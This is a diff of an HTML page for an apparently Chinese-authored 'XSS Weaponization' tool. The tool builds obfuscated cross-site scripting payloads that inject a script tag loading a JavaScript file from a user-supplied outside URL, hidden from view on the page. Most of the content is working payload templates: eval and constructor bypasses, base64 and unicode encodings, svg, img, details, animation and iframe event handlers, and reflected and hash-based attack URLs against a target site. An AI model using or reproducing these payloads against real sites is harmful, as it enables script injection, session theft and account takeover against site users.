@@ -1,214 +1,599 @@
-<html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <title>XSS Weaponization</title>
-    <link rel="stylesheet" type="text/css" href="../css/bootstrap.min.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Weaponization - 1135</title>
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <link rel="stylesheet" href="../../css/style.css">
+    <script src="../../js/main.js"></script>
+    <style>
+        /* Page Specific Styles */
+        .main-content {
+            padding: 40px 20px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .tool-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 40px;
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tool-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: var(--primary-color);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .tool-header h1 {
+            color: var(--primary-color);
+            font-family: var(--font-mono);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .tool-header p {
+            color: var(--text-secondary);
+        }
+
+        .input-block {
+            margin-bottom: 20px;
+        }
+
+        .input-block label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--primary-color);
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .input-block input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #000;
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            border-radius: 0;
+        }
+
+        .input-block input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: var(--shadow-glow);
+        }
+
+        /* Code Output Blocks */
+        .output-block {
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 20px;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .output-block:hover {
+            border-color: var(--primary-color);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .output-block h3 {
+            color: var(--primary-color);
+            font-size: 1rem;
+            margin-bottom: 10px;
+            font-family: var(--font-mono);
+        }
+
+        .output-block pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: var(--font-mono);
+            font-size: 14px;
+            color: var(--text-primary);
+            max-height: 800px;
+            overflow-y: auto;
+        }
+
+        .output-block code {
+            font-family: inherit;
+        }
+
+        .copy-btn {
+            padding: 4px 8px;
+            background: var(--primary-color);
+            color: var(--bg-color);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+            margin-left: 8px;
+            vertical-align: middle;
+            transition: background 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .code-with-copy {
+            position: relative;
+            margin: 8px 0;
+        }
+
+        .code-with-copy {
+            position: relative;
+        }
+
+        .code-with-copy .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: auto;
+        }
+
+        .code-with-copy:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .hint-code {
+            position: relative;
+            margin: 0;
+        }
+        
+        .hint-section .hint-code {
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 10px;
+            margin: 8px 0;
+            overflow-x: auto;
+        }
+
+        hr {
+            border: 0;
+            height: 1px;
+            background: var(--border-color);
+            margin: 40px 0;
+        }
+
+        /* Hint sections styling */
+        .hint-section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(0, 255, 65, 0.05);
+            border-left: 3px solid var(--primary-color);
+            border-radius: 4px;
+        }
+
+        .hint-section strong {
+            color: var(--primary-color);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .hint-section p {
+            color: var(--text-secondary);
+            margin: 8px 0;
+            line-height: 1.6;
+        }
+
+        .hint-code {
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            color: var(--text-primary);
+            overflow-x: auto;
+        }
+
+        /* Lightbulb hint button */
+        .hint-lightbulb {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 255, 65, 0.4);
+            z-index: 9998;
+            transition: all 0.3s ease;
+        }
+
+        .hint-lightbulb:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.6);
+        }
+
+        .hint-lightbulb::before {
+            content: '💡';
+            font-size: 24px;
+        }
+
+        /* Removed interactive hint modal styles - now using direct link */
+    </style>
 </head>
 
 <body>
+    <!-- Navigation -->
+    <div id="navigation-container"></div>
+    <script>
+        // Load Navigation immediately on body start to minimize FOUC
+        (function() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', '../../navigation.html', false); // Synchronous to prevent flash
+            try {
+                xhr.send();
+                if (xhr.status === 200) {
+                    const navContainer = document.getElementById('navigation-container');
+                    navContainer.innerHTML = xhr.responseText;
+                }
+            } catch(e) {
+                console.error('Failed to load navigation:', e);
+            }
+        })();
+    </script>
+
+    <!-- Lightbulb Hint Button -->
+    <div class="hint-lightbulb" onclick="window.open('https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', '_blank')" title="PortSwigger XSS Cheat Sheet"></div>
 
     <!-- payloads template -->
 
     <textarea id="data0"
         hidden="true">with(document)body.appendChild(createElement('script')).src='arr0w1_url'</textarea>
 
-    <textarea id="data1" hidden="true">
-1⃣️ eval(JavaScript_content)
-eval('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')
+    <!-- Payload templates - only commands, no hints -->
+    <textarea id="data1" hidden="true">eval('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')
 
-🔥
-📖without eval
-📖 eval(CODE)    <=>   []["filter"]["constructor"](CODE)()
 []["filter"]["constructor"]('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')()
 
-
-2⃣️ eval(atob(JavaScript_content_BASE64encoded))
 eval(atob('arr0w1_base64'))
 
-🔥
-📖 without . = ( ) ' " etc.
-📖 using ` \ {} [] :
 `eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}
-📖 等价字符串  \x61   \u0061   \u{61}   \u{000000061}
 
+https://target.com/page?title=&quot;&gt;&lt;script&gt;eval(location.hash.split(% 27 % 23 % 27)[1])&lt;/script&gt;&lt;i id=&quot;#&apos;eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29&apos;instanceof{[Symbol[&apos;hasInstance&apos;]]:eval}
 
-3⃣️ XSS in one step (only for Reflected XSS)
-
-🔴 Will be triggered when someone visits the URL:
-https://target.com/page?title="><script>eval(location.hash.split(%27%23%27)[1])</script><i id="#'eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29'instanceof{[Symbol['hasInstance']]:eval}
-
-
-4⃣️ XSS in two steps
-🔴 1. Injection
 eval(location.hash.slice(1))
+
+[]['constructor']['constructor']`a${location['hash']['slice']`1`}```
+
+setTimeout`\u0065\u0076\u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029`
+
+https://target.com/page_with_the_payload#arr0w1_on_event_js
+
+https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29'instanceof{[Symbol['hasInstance']]:eval}</textarea>
+
+    <!-- Hints for payload1 - displayed as descriptions -->
+    <div id="hints1" hidden="true">
+        <div class="hint-section">
+            <strong>[1] eval(JavaScript_content)</strong>
+            <pre class="hint-code">eval('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant: without eval</strong>
+            <p>Note: eval(CODE) <=> []["filter"]["constructor"](CODE)()</p>
+            <pre class="hint-code">[]["filter"]["constructor"]('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')()</pre>
+        </div>
+        <div class="hint-section">
+            <strong>[2] eval(atob(JavaScript_content_BASE64encoded))</strong>
+            <pre class="hint-code">eval(atob('arr0w1_base64'))</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant: without . = ( ) ' " etc.</strong>
+            <p>Note: using ` \ {} [] :</p>
+            <pre class="hint-code">`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}</pre>
+            <p>Note: 等价字符串  \x61   \u0061   \u{61}   \u{000000061}</p>
+        </div>
+        <div class="hint-section">
+            <strong>[3] XSS in one step (only for Reflected XSS)</strong>
+            <p>⚠️ Will be triggered when someone visits the URL:</p>
+            <pre class="hint-code">https://target.com/page?title=&quot;&gt;&lt;script&gt;eval(location.hash.split(% 27 % 23 % 27)[1])&lt;/script&gt;&lt;i id=&quot;#&apos;eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29&apos;instanceof{[Symbol[&apos;hasInstance&apos;]]:eval}</pre>
+        </div>
+        <div class="hint-section">
+            <strong>[4] XSS in two steps</strong>
+            <p>⚠️ Step 1. Injection</p>
+            <pre class="hint-code">eval(location.hash.slice(1))
 // or
 []['constructor']['constructor']`a${location['hash']['slice']`1`}```
 // or
-setTimeout`\u0065\u0076\u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029`
-
-
-🔴 2. Execution - Will be triggered when someone visits the URL:
-https://target.com/page_with_the_payload#arr0w1_on_event_js
+setTimeout`\u0065\u0076\u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029`</pre>
+            <p>⚠️ Step 2. Execution - Will be triggered when someone visits the URL:</p>
+            <pre class="hint-code">https://target.com/page_with_the_payload#arr0w1_on_event_js
 // or
-https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29'instanceof{[Symbol['hasInstance']]:eval}</textarea>
+https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29'instanceof{[Symbol['hasInstance']]:eval}</pre>
+        </div>
+    </div>
 
-    <textarea id="data2" hidden="true">
-1⃣️ set onbegin
+    <script type="text/template" id="data2-template">
 "><svg style=display:none><set onbegin="arr0w1_on_event_js" dur=1s></svg><x id="
 
-🔥
 "><svg style=display:none><set onbegin=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} dur=1s></svg><x id="
 
-🔥
-📖without eval
 "><svg style=display:none><set onbegin=[]['filter']['constructor'](atob('arr0w1_base64'))() dur=1s></svg><x id="
 
-2⃣️ animate onrepeat
 "><svg style=display:none><animate onrepeat="arr0w1_on_event_js" dur=1s repeatCount=2></svg><x id="
 
-🔥
-"><svg style=display:none><animate onrepeat=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} dur=1s repeatCount=2></svg><x id="</textarea>
+"><svg style=display:none><animate onrepeat=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} dur=1s repeatCount=2></svg><x id="
+    </script>
 
-    <textarea id="data3" hidden="true">
-1⃣️ img onerror
-"><img src id=arr0w1_base64 onerror=eval(atob(this.id))><x id="
+    <!-- Hints for payload2 -->
+    <div id="hints2" hidden="true">
+        <div class="hint-section">
+            <strong>[1] set onbegin</strong>
+            <pre class="hint-code">&quot;&gt;&lt;svg style=display:none&gt;&lt;set onbegin=&quot;ARR0W1_ON_EVENT_JS_PLACEHOLDER&quot; dur=1s&gt;&lt;/svg&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant</strong>
+            <pre class="hint-code">&quot;&gt;&lt;svg style=display:none&gt;&lt;set onbegin=`eval\x28atob\x28\x27ARR0W1_BASE64_PLACEHOLDER\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} dur=1s&gt;&lt;/svg&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant: without eval</strong>
+            <pre class="hint-code">&quot;&gt;&lt;svg style=display:none&gt;&lt;set onbegin=[][&apos;filter&apos;][&apos;constructor&apos;](atob(&apos;ARR0W1_BASE64_PLACEHOLDER&apos;))() dur=1s&gt;&lt;/svg&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>[2] animate onrepeat</strong>
+            <pre class="hint-code">&quot;&gt;&lt;svg style=display:none&gt;&lt;animate onrepeat=&quot;ARR0W1_ON_EVENT_JS_PLACEHOLDER&quot; dur=1s repeatCount=2&gt;&lt;/svg&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant</strong>
+            <pre class="hint-code">&quot;&gt;&lt;svg style=display:none&gt;&lt;animate onrepeat=`eval\x28atob\x28\x27ARR0W1_BASE64_PLACEHOLDER\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} dur=1s repeatCount=2&gt;&lt;/svg&gt;&lt;x id=&quot;</pre>
+        </div>
+    </div>
 
-🔥
+    <textarea id="data3" hidden="true">"><img src id=arr0w1_base64 onerror=eval(atob(this.id))><x id="
+
 "><img src onerror=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}><x id="</textarea>
 
-    <textarea id="data4"
-        hidden="true">
-1⃣️ detail ontoggle
-"><details open ontoggle="arr0w1_on_event_js" style=display:none></details><x id="
+    <!-- Hints for payload3 -->
+    <div id="hints3" hidden="true">
+        <div class="hint-section">
+            <strong>[1] img onerror</strong>
+            <pre class="hint-code">&quot;&gt;&lt;img src id=ARR0W1_BASE64_PLACEHOLDER onerror=eval(atob(this.id))&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant</strong>
+            <pre class="hint-code">&quot;&gt;&lt;img src onerror=`eval\x28atob\x28\x27ARR0W1_BASE64_PLACEHOLDER\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}&gt;&lt;x id=&quot;</pre>
+        </div>
+    </div>
 
-🔥
+    <textarea id="data4" hidden="true">"><details open ontoggle="arr0w1_on_event_js" style=display:none></details><x id="
+
 "><details open ontoggle=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} style=display:none></details><x id="</textarea>
-    <textarea id="data5" hidden="true">
-1⃣️ onanimationend
-"><style>@keyframes x{}</style><i style="animation-name:x" onanimationend="arr0w1_on_event_js"></i><x id="
 
-🔥
+    <!-- Hints for payload4 -->
+    <div id="hints4" hidden="true">
+        <div class="hint-section">
+            <strong>[1] detail ontoggle</strong>
+            <pre class="hint-code">&quot;&gt;&lt;details open ontoggle=&quot;ARR0W1_ON_EVENT_JS_PLACEHOLDER&quot; style=display:none&gt;&lt;/details&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant</strong>
+            <pre class="hint-code">&quot;&gt;&lt;details open ontoggle=`eval\x28atob\x28\x27ARR0W1_BASE64_PLACEHOLDER\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} style=display:none&gt;&lt;/details&gt;&lt;x id=&quot;</pre>
+        </div>
+    </div>
+    <textarea id="data5" hidden="true">"><style>@keyframes x{}</style><i style="animation-name:x" onanimationend="arr0w1_on_event_js"></i><x id="
+
 "><style>@keyframes x{}</style><i style="animation-name:x" onanimationend=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}></i><x id="
 
-
-2⃣️ onwebkitanimationend
 "><style>@keyframes x{}</style><i style="animation-name:x" onwebkitanimationend="arr0w1_on_event_js"></i><x id="
 
-🔥
 "><style>@keyframes x{}</style><i style="animation-name:x" onwebkitanimationend=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}></i><x id="</textarea>
 
-    <textarea id="data6" hidden="true">
-1⃣️ iframe src
-<iframe style=display:none src="javascript:arr0w1_on_event_js">
+    <!-- Hints for payload5 -->
+    <div id="hints5" hidden="true">
+        <div class="hint-section">
+            <strong>[1] onanimationend</strong>
+            <pre class="hint-code">&quot;&gt;&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;i style=&quot;animation-name:x&quot; onanimationend=&quot;ARR0W1_ON_EVENT_JS_PLACEHOLDER&quot;&gt;&lt;/i&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant</strong>
+            <pre class="hint-code">&quot;&gt;&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;i style=&quot;animation-name:x&quot; onanimationend=`eval\x28atob\x28\x27ARR0W1_BASE64_PLACEHOLDER\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}&gt;&lt;/i&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>[2] onwebkitanimationend</strong>
+            <pre class="hint-code">&quot;&gt;&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;i style=&quot;animation-name:x&quot; onwebkitanimationend=&quot;ARR0W1_ON_EVENT_JS_PLACEHOLDER&quot;&gt;&lt;/i&gt;&lt;x id=&quot;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant</strong>
+            <pre class="hint-code">&quot;&gt;&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;i style=&quot;animation-name:x&quot; onwebkitanimationend=`eval\x28atob\x28\x27ARR0W1_BASE64_PLACEHOLDER\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}&gt;&lt;/i&gt;&lt;x id=&quot;</pre>
+        </div>
+    </div>
 
-🔥
+    <textarea id="data6" hidden="true"><iframe style=display:none src="javascript:arr0w1_on_event_js">
+
 <iframe style=display:none src="javascript:`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}"></textarea>
 
-<!-- ----------------- -->
+    <!-- Hints for payload6 -->
+    <div id="hints6" hidden="true">
+        <div class="hint-section">
+            <strong>[1] iframe src</strong>
+            <pre class="hint-code">&lt;iframe style=display:none src=&quot;javascript:ARR0W1_ON_EVENT_JS_PLACEHOLDER&quot;&gt;</pre>
+        </div>
+        <div class="hint-section">
+            <strong>→ Variant</strong>
+            <pre class="hint-code">&lt;iframe style=display:none src=&quot;javascript:`eval\x28atob\x28\x27ARR0W1_BASE64_PLACEHOLDER\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}&quot;&gt;</pre>
+        </div>
+    </div>
+
+    <!-- ----------------- -->
 
     <main role="main">
-        <section class="jumbotron text-center g-light">
-            <div class="container">
-                <h1>XSS Weaponization</h1>
-                <p class="lead text-muted">Generate weaponized payloads that are invisible on the page.</p>
+        <div class="container">
+            <div class="tool-header" style="text-align: center; margin-bottom: 30px;">
+                <h1>🛡️ XSS Weaponization</h1>
+                <p class="hint">💡 Generate weaponized payloads that are invisible on the page.</p>
             </div>
-            <br>
 
-            <p class="font-weight-bold">The url of your JavaScript file:</p>
-            <input type="text" id="your_url_path" value="https://xss.com/demo.js" oninput="func_oninput()"
-                class="form-control text-white bg-dark" autofocus
-                onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
+            <div class="input-block">
+                <label for="your_url_path"><strong>The url of your JavaScript file:</strong></label>
+                <input type="text" id="your_url_path" value="https://xss.com/demo.js" autofocus
+                    onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
+            </div>
 
-            <br>
+            <hr>
 
-            <hr> <!-- ---------- -->
-            0
-            <p class="font-weight-bold">JavaScript_content </p>
-            <textarea id="payload0" class="form-control" rows="3"></textarea>
+            <div class="output-block" id="payload0-container">
+                <h3>0 - JavaScript_content</h3>
+                <div class="hint-section">
+                    <strong>Base JavaScript Code</strong>
+                    <div class="code-with-copy">
+                        <button class="copy-btn" onclick="copyPayload('payload0', this)">Copy</button>
+                        <pre class="hint-code"><code id="payload0"></code></pre>
+                    </div>
+                </div>
+            </div>
 
-            <br>
-            <br>
-            1
-            <p class="font-weight-bold">eval(JavaScript_content) </p>
-            <textarea id="payload1" class="form-control" rows="3"></textarea>
+            <div class="output-block" id="payload1-container">
+                <h3>1 - eval(JavaScript_content)</h3>
+                <div id="hints1-display"></div>
+                <div id="payload1-other-display"></div>
+            </div>
 
-            <br>
-            <br>
-            2
-            <p class="font-weight-bold">Tag - svg </p>
-            <textarea id="payload2" class="form-control" rows="3"></textarea>
+            <div class="output-block" id="payload2-container">
+                <h3>2 - Tag: svg</h3>
+                <div id="hints2-display"></div>
+                <div id="payload2-other-display"></div>
+            </div>
 
-            <br>
-            <br>
-            3
-            <p class="font-weight-bold">Tag - img onerror </p>
-            <textarea id="payload3" class="form-control" rows="3"></textarea>
+            <div class="output-block" id="payload3-container">
+                <h3>3 - Tag: img onerror</h3>
+                <div id="hints3-display"></div>
+                <div id="payload3-other-display"></div>
+            </div>
 
-            <br>
-            <br>
-            4
-            <p class="font-weight-bold">Tag - detail ontoggle </p>
-            <textarea id="payload4" class="form-control" rows="3"></textarea>
+            <div class="output-block" id="payload4-container">
+                <h3>4 - Tag: detail ontoggle</h3>
+                <div id="hints4-display"></div>
+                <div id="payload4-other-display"></div>
+            </div>
 
-            <br>
-            <br>
-            5
-            <p class="font-weight-bold">Tag - style </p>
-            <textarea id="payload5" class="form-control" rows="3"></textarea>
+            <div class="output-block" id="payload5-container">
+                <h3>5 - Tag: style</h3>
+                <div id="hints5-display"></div>
+                <div id="payload5-other-display"></div>
+            </div>
 
-            <br>
-            <br>
-            6
-            <p class="font-weight-bold">URLs </p>
-            <textarea id="payload6" class="form-control" rows="3"></textarea>
-
-        </section>
+            <div class="output-block" id="payload6-container">
+                <h3>6 - URLs</h3>
+                <div id="hints6-display"></div>
+                <div id="payload6-other-display"></div>
+            </div>
+        </div>
     </main>
 
-    <footer class="text-muted">
-        <div class="container">
-            <p class="float-right">
-                <a href="#">Back to TOP</a>
-            </p>
-            <p>arr0w1</p>
-        </div>
+    <footer class="text-muted" style="text-align: center; padding: 20px; margin-top: 40px;">
+        <p><a href="#" style="color: var(--primary-color);">Back to TOP</a></p>
+        <p style="color: var(--text-secondary);">arr0w1</p>
     </footer>
+
 
 </body>
 
 
 <script>
+    // Removed toggleHint and closeHintOnBackdrop functions - now using direct link
+
+    document.addEventListener('DOMContentLoaded', function() {
+        // Navigation is already loaded, just ensure language is applied
+            if (typeof applyLanguage === 'function') {
+                applyLanguage(localStorage.getItem('lang') || 'zh');
+        }
 
     // -----
 
     // get elements - hiddened
+        try {
     element_data0 = document.getElementById("data0");
     element_data1 = document.getElementById("data1");
-    element_data2 = document.getElementById("data2");
+            element_data2_template = document.getElementById("data2-template");
     element_data3 = document.getElementById("data3");
     element_data4 = document.getElementById("data4");
     element_data5 = document.getElementById("data5");
     element_data6 = document.getElementById("data6");
 
+            // Check if all required elements exist
+            if (!element_data0 || !element_data1 || !element_data2_template || !element_data3 || 
+                !element_data4 || !element_data5 || !element_data6) {
+                console.error('Missing required data elements:', {
+                    data0: !!element_data0,
+                    data1: !!element_data1,
+                    data2: !!element_data2_template,
+                    data3: !!element_data3,
+                    data4: !!element_data4,
+                    data5: !!element_data5,
+                    data6: !!element_data6
+                });
+            }
+
     // get datas
-    var data0 = element_data0.value;
-    var data1 = element_data1.value;
-    var data2 = element_data2.value;
-    var data3 = element_data3.value;
-    var data4 = element_data4.value;
-    var data5 = element_data5.value;
-    var data6 = element_data6.value;
+            var data0 = element_data0 ? element_data0.value : '';
+            var data1 = element_data1 ? element_data1.value : '';
+            var data2 = element_data2_template ? element_data2_template.textContent.trim() : '';
+            var data3 = element_data3 ? element_data3.value : '';
+            var data4 = element_data4 ? element_data4.value : '';
+            var data5 = element_data5 ? element_data5.value : '';
+            var data6 = element_data6 ? element_data6.value : '';
+        } catch (e) {
+            console.error('Error loading data elements:', e);
+            // Set defaults to prevent further errors
+            var data0 = '';
+            var data1 = '';
+            var data2 = '';
+            var data3 = '';
+            var data4 = '';
+            var data5 = '';
+            var data6 = '';
+        }
 
     // -----
 
-    //textarea增高 随内容自动增加textarea的高度
-    function auto_grow(element) {
-        element.style.height = "5px";
-        element.style.height = (element.scrollHeight) + "px";
+    // Copy payload safely
+        function copyPayload(id, btnElement) {
+        const element = document.getElementById(id);
+        const text = element.textContent;
+        navigator.clipboard.writeText(text).then(() => {
+            // Visual feedback
+                if (btnElement) {
+                    const originalText = btnElement.textContent;
+                    btnElement.textContent = 'Copied!';
+            setTimeout(() => {
+                        btnElement.textContent = originalText;
+            }, 1500);
+                }
+        });
     }
 
-    // -----
+        // Make copyPayload available globally for onclick handlers
+        window.copyPayload = copyPayload;
 
     // 生成不带=的base64字符串
     function func_wise_btoa(str1) {
@@ -224,40 +609,325 @@ https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\
     }
 
     var func_oninput = function () {
-
+        try {
         var your_url_path = document.getElementById("your_url_path").value;
 
-        var js_code_append_a_script_tag_with_url_path = document.getElementById("data0").value.replace("arr0w1_url", your_url_path);
+            var data0_element = document.getElementById("data0");
+            if (!data0_element) {
+                console.error('data0 element not found');
+                return;
+            }
+
+            var js_code_append_a_script_tag_with_url_path = data0_element.value.replace("arr0w1_url", your_url_path);
 
         var js_code_append_a_script_tag_btoa_ed = func_wise_btoa(js_code_append_a_script_tag_with_url_path);
 
-        document.getElementById("payload0").value = js_code_append_a_script_tag_with_url_path;
+        // IMPORTANT: Use textContent to prevent XSS execution
+            var payload0 = document.getElementById("payload0");
+            if (payload0) {
+                payload0.textContent = js_code_append_a_script_tag_with_url_path;
+            }
 
-        document.getElementById("payload1").value = data1.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed).replace(/arr0w1_url/g, your_url_path);
+            // Function to split payload and display as separate commands
+            function displayPayloadOther(payloadId, payloadData, labels) {
+                const displayElement = document.getElementById(`${payloadId}-other-display`);
+                if (!displayElement || !payloadData) {
+                    console.warn(`displayPayloadOther: element or data missing for ${payloadId}`);
+                    return;
+                }
+                
+                // Split by newlines and filter empty lines
+                const commands = payloadData.split('\n').map(cmd => cmd.trim()).filter(cmd => cmd.length > 0);
+                
+                if (commands.length === 0) {
+                    console.warn(`displayPayloadOther: no commands found for ${payloadId}`);
+                    return;
+                }
+                
+                displayElement.innerHTML = '';
+                
+                commands.forEach((cmd, index) => {
+                    const hintSection = document.createElement('div');
+                    hintSection.className = 'hint-section';
+                    
+                    const label = labels && labels[index] ? labels[index] : `[${index + 1}] Command`;
+                    
+                    // Create elements safely
+                    const strong = document.createElement('strong');
+                    strong.textContent = label;
+                    
+                    const codeWrapper = document.createElement('div');
+                    codeWrapper.className = 'code-with-copy';
+                    codeWrapper.style.position = 'relative'; // Ensure positioning context
+                    
+                    const copyBtn = document.createElement('button');
+                    copyBtn.className = 'copy-btn';
+                    copyBtn.textContent = 'Copy';
+                    copyBtn.style.position = 'absolute';
+                    copyBtn.style.top = '5px';
+                    copyBtn.style.right = '5px';
+                    copyBtn.style.zIndex = '10';
+                    copyBtn.style.opacity = '0';
+                    copyBtn.style.transition = 'opacity 0.3s ease';
+                    copyBtn.style.pointerEvents = 'auto';
+                    copyBtn.onclick = function(e) {
+                        e.stopPropagation();
+                        navigator.clipboard.writeText(cmd).then(() => {
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copied!';
+                            setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                            }, 1500);
+                        }).catch(err => {
+                            console.error('Failed to copy:', err);
+                        });
+                    };
+                    
+                    const pre = document.createElement('pre');
+                    pre.className = 'hint-code';
+                    const code = document.createElement('code');
+                    code.textContent = cmd;
+                    pre.appendChild(code);
+                    
+                    // Add hover effect to show copy button
+                    codeWrapper.addEventListener('mouseenter', function() {
+                        copyBtn.style.opacity = '1';
+                    });
+                    codeWrapper.addEventListener('mouseleave', function() {
+                        copyBtn.style.opacity = '0';
+                    });
+                    
+                    codeWrapper.appendChild(copyBtn);
+                    codeWrapper.appendChild(pre);
+                    
+                    hintSection.appendChild(strong);
+                    hintSection.appendChild(codeWrapper);
+                    
+                    displayElement.appendChild(hintSection);
+                });
+                
+            }
 
-        // 全部匹配 /g
-        document.getElementById("payload2").value = data2.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+            // Process payload1
+            if (data1) {
+                const processed1 = data1.replace(/arr0w1_on_event_js/g, js_code_append_a_script_tag_with_url_path)
+                    .replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed)
+                    .replace(/arr0w1_url/g, your_url_path);
+                displayPayloadOther('payload1', processed1, [
+                    '[1] eval() method',
